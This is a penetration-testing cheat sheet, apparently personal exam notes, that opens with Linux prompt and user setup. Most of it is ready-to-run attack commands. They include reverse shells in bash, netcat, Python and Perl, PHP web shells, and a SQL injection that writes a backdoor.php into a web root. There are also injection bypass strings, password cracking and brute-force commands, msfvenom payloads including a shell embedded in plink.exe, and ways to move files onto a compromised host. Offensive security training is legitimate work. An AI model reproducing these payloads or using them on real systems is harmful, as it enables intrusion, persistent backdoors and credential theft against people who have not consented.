
0- once login create 2 extra sudo users 
        # useradd -m aquasan21
        # passswd aquasan21
        # usermod -a -G sudo aquasan21
        # chsh -s /bin/bash aquasan21
        # userdel aquasan21 <- once not required
        
0- Change command prompt 
        //# hostname -I | awk '{print $1}'
        //# fconfig | grep 'eth0' -A 1 | tail -1 |  sed 's/.............//' | cut -d " " -f1
        
        //# export PS1='$(whoami)@$(hostname):$(pwd)'
        
        //#XIP = (hostname -I | awk { printf $1 } )
        //#export PS1="$(whoami)@$($XIP):$(pwd) > "
        
        //export san=ifconfig | grep 'eth0' -A 1 | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | tail -1
        
        p="$(ifconfig |grep inet | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | head -1 2>&1)"
        export PS1='[$(whoami)@$(echo $p):$(pwd)]# '
       
        
0-  To Save time for exam try to login as root, to save some time, no sudo <- typing 
0-  Once you get ip save it in following files

        cp ~/.bashrc ~/.bashrc.bak
        
        Bash shell's startup script add varibales in 
        "~/.bashrc" (or "~/.bash_profile", or "~/.profile")

        System Wide change 
        add varibale in "/etc/profile" 

        Set global varibale 
        # "export varname=value", which sets the variable and exports it to the global environment (available to other processes).

        Set Path
        # export PATH=/path/to/dir:$PATH

        Refresh the bash shell
        # source ~/.bashrc || ~/.bash_profile || ~/.profile|| /etc/profile

0- Reste debain Desktop enviournment 
        # dconf reset -f /org/gnome/
        
        
        
0 - Quick TCP Scan
        nmap -sC -sV -vv -oA quick target

0 - Quick UDP Scan
        nmap -sU -sV -vv -oA quick_udp target

0 - Full TCP Scan
        nmap -sC -sV -p- -vv -oA full target

0 - Port knock
        for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --maxretries 0 -p $x target; done

0 - Web Scanning
        Gobuster quick directory busting
        gobuster -u target -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux
        
0 - Gobuster search with file extension
        gobuster -u target -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php

0 - Nikto web server scan
        nikto -h target
0 - Wordpress scan
        wpscan -u target/wp/

0- Netcat banner grab
        nc -v target port

0- SMB Vulnerability Scan
        nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vulnms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse target

0 - SMB Users & Shares Scan
        nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse target

        Enum4linux
                enum4linux -a target
        Null connect
                rpcclient -U "" target
        Connect to SMB share
                smbclient //MOUNT/share
0 - SNMP enumeration
        snmp-check target

0 - Reverse Shells
        Bash shell
                bash -i >& /dev/tcp/target/4443 0>&1

        Netcat Linux
                nc -e /bin/sh target 4443

        Netcat Windows
                nc -e cmd.exe target 4443

        Python
                python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("target",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

       Perl
                perl -e 'use Socket;$i="target";$p=4443;socket(S,PF_INET,SOCK_STREAM,getproto byname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

0 - Remote Desktop
        Remote Desktop for windows with share and 85% screen
                rdesktop -u username -p password -g 85% -r disk:share=/root/ target

0 - PHP
        PHP command injection from GET Request
                <?php echo system($_GET["cmd"]);?>
                <?php echo shell_exec($_GET["cmd"]);?>
                
0 - Powershell
        Non-interactive execute powershell file
                powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1

0 - SSH Tunneling / Pivoting
        shuttle
                sshuttle -vvr user@target 10.1.1.0/24

0 - Local port forwarding
        ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
    
    Remote port forwarding
        ssh <gateway> -R <remote port to bind>:<local host>:<local port>

        Dynamic port forwarding
        ssh -D <local proxy port> -p <remote port> <target>

        Plink local port forwarding
        plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>

0 - Upload php command injection file
        union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'

0 - Load File 
        union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
        
        Bypasses
                ' or 1=1 LIMIT 1 --
                ' or 1=1 LIMIT 1 -- -
                ' or 1=1 LIMIT 1#
                'or 1#
                ' or 1=1 --
                ' or 1=1 -- -
0 - Brute force
                John the Ripper shadow file
                $ unshadow passwd shadow > unshadow.db
                $ john unshadow.db

                # Hashcat SHA512 $6$ shadow file
                        hashcat -m 1800 -a 0 hash.txt rockyou.txt --username

                #Hashcat MD5 $1$ shadow file
                        hashcat -m 500 -a 0 hash.txt rockyou.txt --username

                # Hashcat MD5 Apache webdav file
                        hashcat -m 1600 -a 0 hash.txt rockyou.txt

                # Hashcat SHA1
                        hashcat -m 100 -a 0 hash.txt rockyou.txt --force

                # Hashcat Wordpress
                        hashcat -m 400 -a 0 --remove hash.txt rockyou.txt

                RDP user with password list
                        ncrack -vv --user offsec -P passwords rdp://target

                SSH user with password list
                        hydra -l user -P pass.txt -t 10 target ssh -s 22
                
                FTP user with password list
                        medusa -h target -u user -P passwords.txt -M ftp


0 - MSFVenom Payloads
                # PHP reverse shell
                        msfvenom -p php/meterpreter/reverse_tcp LHOST=target LPORT=4443 -f raw -o shell.php

                # Java WAR reverse shell
                        msfvenom -p java/shell_reverse_tcp LHOST=target LPORT=4443 -f war -o shell.war

                # Linux bind shell
                        msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai

                # Linux FreeBSD reverse shell
                        msfvenom -p bsd/x64/shell_reverse_tcp LHOST=target LPORT=4443 -f elf -o shell.elf

                # Linux C reverse shell
                        msfvenom -p linux/x86/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f c

                # Windows non staged reverse shell 
                        msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe

                # Windows Staged (Meterpreter) reverse shell
                        msfvenom -p windows/meterpreter/reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe

                # Windows Python reverse shell
                        msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 EXITFUNC=thread -f python -o shell.py

                # Windows ASP reverse shell
                        msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp

                # Windows ASPX reverse shell
                        msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx

                # Windows JavaScript reverse shell with nops
                        msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f js_le -e generic/none -n 18

                # Windows Powershell reverse shell
                        msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

                # Windows reverse shell excluding bad characters 
                        msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=target LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
                
                # Windows x64 bit reverse shell
                        msfvenom -p windows/x64/shell_reverse_tcp LHOST=target LPORT=4443 -f exe -o shell.exe

                # Windows reverse shell embedded into plink
                        msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windowsbinaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe


0 - Interactive Shell
                Upgrading to a fully interactive TTY using Python
                        # Enter while in reverse shell
                                $ python -c 'import pty; pty.spawn("/bin/bash")'
                                Ctrl-Z  
                        # In Kali
                                $ stty raw -echo
                                $ fg

                        # In reverse shell
                                $ reset
                                $ export SHELL=bash
                                $ export TERM=xterm-256color
                                $ stty rows <num> columns <cols>

0 - File Transfers
                HTTP
                        The most common file transfer method.
                        # In Kali
                                python -m SimpleHTTPServer 80
                        # In reverse shell - Linux
                                wget target/file

                        # In reverse shell - Windows
                                powershell -c "(new-object System.Net.WebClient).DownloadFile('http://target/file.exe','C:\Users\user\Desktop\file.exe')"

0 - FTP
        # In Kali
                python -m pyftpdlib -p 21 -w

        # In reverse shell
                echo open target > ftp.txt
                echo USER anonymous >> ftp.txt
                echo ftp >> ftp.txt
                echo bin >> ftp.txt
                echo GET file >> ftp.txt
                echo bye >> ftp.txt

        # Execute
                ftp -v -n -s:ftp.txt

0 - tftp 
        # In Kali
                atftpd --daemon --port 69 /tftp

        # In reverse shell
                tftp -i target GET nc.exe










